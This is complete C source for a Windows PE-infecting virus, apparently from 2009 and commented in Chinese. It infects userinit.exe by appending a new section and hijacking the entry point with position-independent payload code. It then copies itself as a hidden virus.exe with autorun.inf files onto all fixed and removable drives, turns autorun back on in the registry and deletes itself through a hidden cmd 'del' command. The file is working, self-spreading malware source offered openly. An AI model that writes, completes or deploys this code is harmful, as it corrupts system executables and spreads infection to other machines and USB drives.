//////////////////////////////////////////////////////////////////////////
//FileName:	Virus
//Data:		2009-04-22
//Remark:	PE感染型病毒代码
//////////////////////////////////////////////////////////////////////////
#pragma once
#include <stdio.h>
#include <Windows.h>
#pragma data_seg(".mydat")
#pragma code_seg(".shell")
#pragma const_seg(".constdata")
#pragma comment(linker,"/SECTION:.mydat,RWE")
#pragma comment(linker,"/SECTION:.shell,RWE")
#pragma comment(linker,"/SECTION:.constdata,RWE")
#pragma comment(linker,"/MERGE:.mydat=.shell")
#pragma comment(linker,"/MERGE:.constdata=.shell")
#pragma comment(linker, "/OPT:NOWIN98")
#pragma comment(linker, "/subsystem:windows /entry:main")

//////////////////////////////////////////////////////////////////////////
//宏定义部分
//////////////////////////////////////////////////////////////////////////

//感染目标文件
#define TARGET	"\\userinit.exe"
//感染标记
#define INFECTFLAG	19901117

//////////////////////////////////////////////////////////////////////////
//Payload 部分
//////////////////////////////////////////////////////////////////////////
//宏定义、函数声明部分
//此宏可实现代码重定位
#define RECODE(A) { _asm call A _asm A: _asm pop ebx _asm lea eax,A _asm sub ebx,eax }
//重定位字符串偏移
#define RecodeStrOffset(pStr)  { _asm mov eax,[pStr] _asm lea eax,[ebx+eax] _asm mov pStr,eax } 
#define RecodeVarOffset(dwGlovalVar,dwLocalVar)  { _asm mov eax,[ebx+dwGlovalVar] _asm mov dwLocalVar,eax }
//动态搜索函数地址
void GetKernelFunc(void);
//核心payload
void ShellExcute(char* szDll,char* szFunc,char* szAction,char* szUrl);
//用于函数名比较
int FunCompare(char* str1,char* str2);

//Typedef 函数
typedef HINSTANCE (WINAPI *pLoadLibraryFunc)(LPCTSTR);
typedef DWORD (WINAPI *pShellExcuteFunc)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT);


//Payload 从这里开始
DWORD EntryPoint = 0;
char szShellExcute[] = "ShellExecuteA";
char szShell[] = "Shell32.dll";
char szKernel[] = "Kernel32.dll";
char szAction[] = "open";
char szUrl[] = "www.google.cn";
char szLoadLibrary[] = "LoadLibraryA";
char szGetProcAddress[] = "GetProcAddress";

DWORD dwLoadLibrary = 0;
DWORD dwGetProcAddress = 0;

void BeginPoint(void)
{
	RECODE(A);
	DWORD OldEntryPoint = 0;
	RecodeVarOffset(EntryPoint,OldEntryPoint)
	GetKernelFunc();

	ShellExcute(szShell,szShellExcute,szAction,szUrl);

	_asm{
		jmp OldEntryPoint
	}

}


//////////////////////////////////////////////////////////////////////////
//用于函数名比较
//////////////////////////////////////////////////////////////////////////
int FunCompare(char* str1,char* str2)
{
	while ( *str1 && *str2 && *str1==*str2)
	{
		str1++;str2++;
	}

	return (*str1-*str2);
}
//////////////////////////////////////////////////////////////////////////
//获取Kernel32基地址，并搜索 LoadLibraryA() 和 GetProcAddress() 地址
//////////////////////////////////////////////////////////////////////////
void GetKernelFunc(void)
{
	RECODE(A);

	PBYTE pLoadLibrary = (PBYTE)szLoadLibrary;
	PBYTE pGetProcAddress = (PBYTE)szGetProcAddress;

	RecodeStrOffset(pLoadLibrary);
	RecodeStrOffset(pGetProcAddress);

	//获取Kernel32.dll的基地址
	DWORD dwKernelBase = 0;
	_asm{
		mov	eax,dword ptr fs:[30h]
		mov eax,dword ptr [eax+0Ch]
		mov esi,dword ptr [eax+1Ch]
		lods dword ptr [esi]
		mov eax,dword ptr [eax+08h]
		mov dwKernelBase,eax
	}

	//Kernel32.dll的DOS头和PE头
	IMAGE_DOS_HEADER *pHdr = (IMAGE_DOS_HEADER*)dwKernelBase;
	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)dwKernelBase+pHdr->e_lfanew);

	//数据目录项
	IMAGE_DATA_DIRECTORY *pDatHdr = pNTHdr->OptionalHeader.DataDirectory;
	//导出表
	IMAGE_EXPORT_DIRECTORY *pEPTHdr = (IMAGE_EXPORT_DIRECTORY*)((PBYTE)dwKernelBase + pDatHdr->VirtualAddress);
	//导出函数地址
	DWORD* dwFunAdr = (DWORD*)((PBYTE)dwKernelBase + pEPTHdr->AddressOfFunctions);
	DWORD* dwAdr = (DWORD*)((PBYTE)dwKernelBase + pEPTHdr->AddressOfNames);
	DWORD dwFunc = 0;

	//遍历出 LoadLibray() 和 GetProcAddress() 的地址
	for (unsigned int i=0;i<pEPTHdr->NumberOfNames;i++)
	{
		if (FunCompare((char*)dwKernelBase+dwAdr[i],(char*)pLoadLibrary)==0)
		{
			dwFunc = dwFunAdr[i];
			_asm{
				RECODE(B)
				mov eax,dwFunc
				add eax,dwKernelBase
				mov	[ebx+dwLoadLibrary],eax
			}
			continue;
		}
		if (FunCompare((char*)dwKernelBase+dwAdr[i],(char*)pGetProcAddress)==0)
		{
			dwFunc = dwFunAdr[i];
			_asm{
				RECODE(C)
				mov eax,dwFunc
				add eax,dwKernelBase
				mov	[ebx+dwGetProcAddress],eax
			}
		}
	}
}
//////////////////////////////////////////////////////////////////////////
//执行Shell，此函数可扩展
//////////////////////////////////////////////////////////////////////////
void ShellExcute(char* szDll,char* szFunc,char* szAction,char* szUrl)
{
	RECODE(A);
	char *pLocalDll = szDll;
	RecodeStrOffset(szDll);
	RecodeStrOffset(szFunc);
	RecodeStrOffset(szAction);
	RecodeStrOffset(szUrl);

	//kernel32.dll BaseAddress : 0x7c800000.
	DWORD LoadLibrary = 0x7c800000;
	DWORD GetProcAddress = 0x7c800000;

	RecodeVarOffset(dwLoadLibrary,LoadLibrary);
	RecodeVarOffset(dwGetProcAddress,GetProcAddress);

	HMODULE hDll = ((HMODULE(WINAPI*)(char*))LoadLibrary)(szDll);
	PROC dwFunAddr = ((PROC(WINAPI*)(HMODULE,char*))GetProcAddress)(hDll,szFunc);

	_asm{
		mov eax,dwFunAddr
		push 0
		push 0
		push 0
		push szUrl
		push szAction
		push 0
		call eax
	}
}

///////////////////////////////////////////////////////////////////////////
//Payload在这里结束
//////////////////////////////////////////////////////////////////////////
void EndPoint(void){}


//////////////////////////////////////////////////////////////////////////
//函数声明部分
//////////////////////////////////////////////////////////////////////////
//感染指定文件
BOOL InfectFile(const char* fname);
//感染各驱动盘
BOOL InfectDriver(void);
//是否是正常PE文件
BOOL IsPeFile(PVOID pHdr);
//是否已被感染
BOOL IsInfected(PVOID pHdr);
//字节对齐
int Align(int size,int n);
//修改注册表，实现自动运行
BOOL SetAutorun(void);
//模拟打开盘符
BOOL OpenPath(void);
//自删除
BOOL SelfDelete(void);
//////////////////////////////////////////////////////////////////////////
//Main Function
//////////////////////////////////////////////////////////////////////////
int main(void)
{
	//感染目标文件路径
	char path[MAX_PATH] = {0};

	//获取系统目录
	GetSystemDirectory(path,MAX_PATH);

	strcat(path,TARGET);
	//感染目标文件
	if (!InfectFile(path))
	{
		return 0;
	}

	//感染所有磁盘
	InfectDriver();

	//修改注册表，实现自动播放
	SetAutorun();

	//获取本程序路径
	GetModuleFileName(NULL,path,MAX_PATH);
	if (strlen(path) != strlen("X:\\Virus.exe"))
	{
		//自删除
		SelfDelete();
		return 0;
	}
	else
	{
		//模拟打开盘符
		OpenPath();
	}

	//演示用对话框，读者可删
	MessageBox(NULL,"I'm Virus","Virus",MB_OK);

	return 0;
}

//////////////////////////////////////////////////////////////////////////
//感染指定文件
//////////////////////////////////////////////////////////////////////////
BOOL InfectFile(const char* fname)
{
	HANDLE hFile = CreateFile(fname,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL);

	if (!hFile)
	{
		return FALSE;
	}
	HANDLE hMapFile = CreateFileMapping(hFile,NULL,PAGE_READWRITE,NULL,NULL,NULL);
	if (!hMapFile)
	{
		CloseHandle(hFile);
		return FALSE;
	}
	PVOID  pHdr = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,NULL,NULL,NULL);
	if (!pHdr)
	{
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	// 判断是否为正常PE文件
	if (!IsPeFile(pHdr))
	{
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	//判断是否已被感染
	if (IsInfected(pHdr))
	{
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}
	//PE头指针： 文件头指针+DOS头的e_lfanew位指定的PE头偏移
	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)->e_lfanew);
	//节区头指针： PE头指针+PE头的长度
	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + sizeof(IMAGE_NT_HEADERS));

	//两个节区指针，可以综合填充一个新节区
	//最后一个节指针
	IMAGE_SECTION_HEADER *pLastSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections-1];
    //定义 一个新节
	IMAGE_SECTION_HEADER *pNewSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections];

	//节区数目加一
	pNTHdr->FileHeader.NumberOfSections++;

	//两个偏移量
	DWORD dwFileAlign = pNTHdr->OptionalHeader.FileAlignment;
	DWORD dwSecAlign  = pNTHdr->OptionalHeader.SectionAlignment;
	//感染的代码长度
	DWORD dwCodeSize  = (DWORD)EndPoint - (DWORD)&EntryPoint; 
	//填充新节的各字段
	memcpy(pNewSec->Name,".0xQo",6);
	pNewSec->PointerToRawData	=	pLastSec->PointerToRawData + pLastSec->SizeOfRawData;
	pNewSec->VirtualAddress		=	pLastSec->VirtualAddress + Align(pLastSec->Misc.VirtualSize,dwSecAlign);
	pNewSec->SizeOfRawData		=	Align(dwCodeSize,dwSecAlign);
	pNewSec->Misc.VirtualSize	=	Align(dwCodeSize,dwSecAlign);
	pNewSec->Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;

	//修正PE镜像大小
	pNTHdr->OptionalHeader.SizeOfCode += pNewSec->Misc.VirtualSize;
	pNTHdr->OptionalHeader.SizeOfImage += pNewSec->Misc.VirtualSize;

	DWORD dwSize = 0;
	SetFilePointer(hFile,pNewSec->PointerToRawData,NULL,FILE_BEGIN);
	WriteFile(hFile,&EntryPoint,pNewSec->Misc.VirtualSize,&dwSize,NULL);
	SetEndOfFile(hFile);

	//设置新的入口点(可以考虑EPO来混淆)
	DWORD dwOldEntryPoint = pNTHdr->OptionalHeader.AddressOfEntryPoint + pNTHdr->OptionalHeader.ImageBase;
	SetFilePointer(hFile,pNewSec->PointerToRawData,NULL,FILE_BEGIN);
	WriteFile(hFile,&dwOldEntryPoint,4,&dwSize,NULL);
	pNTHdr->OptionalHeader.AddressOfEntryPoint = pNewSec->VirtualAddress + (DWORD)BeginPoint - (DWORD)&EntryPoint;

	//处理后事..
	FlushViewOfFile(pHdr,pNTHdr->OptionalHeader.SizeOfHeaders);

	UnmapViewOfFile(pHdr);
	CloseHandle(hMapFile);
	CloseHandle(hFile);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//感染各驱动盘
//////////////////////////////////////////////////////////////////////////
BOOL InfectDriver(void)
{
	for (char ch='C';ch<='Z';ch++)
	{
		//存储释放路径,先构造盘符
		char path[MAX_PATH] = {ch,':'};

		//只感染硬盘和U盘类
		if (GetDriveType(path)==DRIVE_FIXED || GetDriveType(path)==DRIVE_REMOVABLE)
		{
			char p[MAX_PATH] = {0};
			memcpy(p,path,MAX_PATH);

			//释放的EXE路径
			strcat(path,"\\virus.exe");
			char temp[MAX_PATH] = {0};
			//获取本程序路径
			GetModuleFileName(NULL,temp,MAX_PATH);
			//复制文件
			CopyFile(temp,path,false);
			//设置文件属性为 系统|隐藏
			SetFileAttributes(path,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

			//使用autorun实现启动
			strcat(p,"\\autorun.inf");
			//重新生成autorun.inf	
			DeleteFile(p);
			FILE *fp = fopen(p,"a");
			memset(temp,0,MAX_PATH);
			//Autorun.inf的写法
			memcpy(temp,"[Autorun]\nOPEN=virus.exe\nshell\\open=打开(&O)\nshell\\open\\Command=virus.exe\nshell\\open\\Default=1\nshell\\explore=资源管理器(&X)\nshell\\explore\\Command=virus.exe",MAX_PATH);
			fputs(temp,fp);
			fclose(fp);
			SetFileAttributes(p,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
		}

	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//是否是正常PE文件
//////////////////////////////////////////////////////////////////////////
BOOL IsPeFile(PVOID pHdr)
{
	//判断DOS头标志是否正确
	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;
	if (p1->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return FALSE;
	}
	//判断PE头标志是否正确
    IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1->e_lfanew);
	if (p2->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//是否已被感染
//////////////////////////////////////////////////////////////////////////
BOOL IsInfected(PVOID pHdr)
{
	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;
	//判断DOS头的保留位是否已被填充为 19901117
	if ( p->e_res2[0] == (WORD)INFECTFLAG)
	{
		return TRUE;
	}
	else
	{
		p->e_res2[0] = (WORD)INFECTFLAG;
		return FALSE;
	}
}

//////////////////////////////////////////////////////////////////////////
//字节对齐
//////////////////////////////////////////////////////////////////////////
int Align(int size,int n)
{
	if (size%n)
	{
		return (size/n + 1)*n;
	}
	
	return size;
}


//////////////////////////////////////////////////////////////////////////
//修改注册表，实现自动运行
//////////////////////////////////////////////////////////////////////////
BOOL SetAutorun(void)
{
	//Remark:  NoDriveTypeAutoRun键值为145代表开启自动运行，255为关闭自动运行

	HKEY hKey;
	long iret = RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",&hKey);
	if (iret != ERROR_SUCCESS)
	{
		return FALSE;
	}
	DWORD dwValue = 145;
	iret =RegSetValueEx(hKey,"NoDriveTypeAutoRun",NULL,REG_DWORD,(PBYTE)&dwValue,4);
	if (iret != ERROR_SUCCESS)
	{
		return FALSE;
	}
	RegCloseKey(hKey);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//模拟打开盘符
//////////////////////////////////////////////////////////////////////////
BOOL OpenPath(void)
{
	//获取当前目录
	char path[MAX_PATH] = {0};
	GetModuleFileName(NULL,path,MAX_PATH);
	path[strlen(path)-9] = '\0';
	//打开当前目录
	ShellExecute(NULL,NULL,path,NULL,NULL,SW_SHOWNORMAL);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//自删除
//////////////////////////////////////////////////////////////////////////
BOOL SelfDelete(void)
{
	char	szModule[MAX_PATH];
	char	szComspec[MAX_PATH];
	char	szParams[MAX_PATH];

	//获得此文件名
	if ( GetModuleFileName(0,szModule,MAX_PATH)!=0 && GetShortPathName(szModule,szModule,MAX_PATH)!=0 && GetEnvironmentVariable(TEXT("COMSPEC"),szComspec,MAX_PATH)!=0 )
	{
		//设置命令参数
		lstrcpy(szParams,TEXT(" /c del "));
		lstrcat(szParams,szModule);
		lstrcat(szParams,TEXT(" > nul"));
		lstrcat(szComspec,szParams);

		//填充结构体
		STARTUPINFO	si = {0};
		PROCESS_INFORMATION	pi = {0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		//为程序设置实时优先级
		SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_TIME_CRITICAL);

		//创建远程进程
		if (CreateProcess(0,szComspec,0,0,0,CREATE_SUSPENDED | DETACHED_PROCESS,0,0,&si,&pi))
		{
			//暂停一直到该程序退出再执行
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);

			//以低级别恢复批处理
			ResumeThread(pi.hThread);

			return TRUE;
		}
		else
		{
			SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_NORMAL);
		}
	}

	return FALSE;
}